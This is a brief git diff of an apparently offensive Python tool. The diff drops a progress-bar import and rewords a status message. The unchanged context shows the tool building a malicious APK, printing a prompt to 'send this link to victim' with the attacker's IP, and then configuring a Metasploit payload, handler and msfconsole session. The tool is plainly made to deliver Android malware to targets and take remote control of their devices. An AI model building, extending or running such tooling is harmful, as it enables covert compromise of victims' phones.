@@ -8,7 +8,6 @@ Created on Wed Mar  4 10:14:55 2020
 import os, sys
 import netifaces as ni
 import time
-from tqdm import tqdm
 
 
 #Global varables
@@ -134,7 +133,7 @@ def main():
         print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
         msf = input(red_ex + " Metasploit = > [Y/n]: ")
         if msf[0].upper() == 'Y':
-            print("Config payload..")
+            print(red_ex + " Config payload..")
             metaConfig(ip, port)
             systemHandler()
             msfconsole()
